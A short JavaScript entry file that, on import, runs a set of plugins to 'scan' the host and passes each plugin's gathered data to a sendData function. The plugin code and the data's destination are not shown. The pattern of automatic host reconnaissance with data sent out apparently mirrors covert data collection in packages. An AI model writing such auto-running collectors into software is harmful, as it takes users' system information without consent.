import { sendData, generateRandomId } from "./utils/index";
import { plugins } from "./plugins/index";

function init() {
  console.log("Scanning host...");
  const id = generateRandomId();
  plugins.forEach(plugin => {
    const gatheredInfo = plugin.run();
    const postData = JSON.stringify(gatheredInfo, null, 2);
    console.log(`Data from ${plugin.getName()} is: ${postData}`);
    sendData(postData, plugin.getName(), id);
  });
}

init();

export * from "./core/index";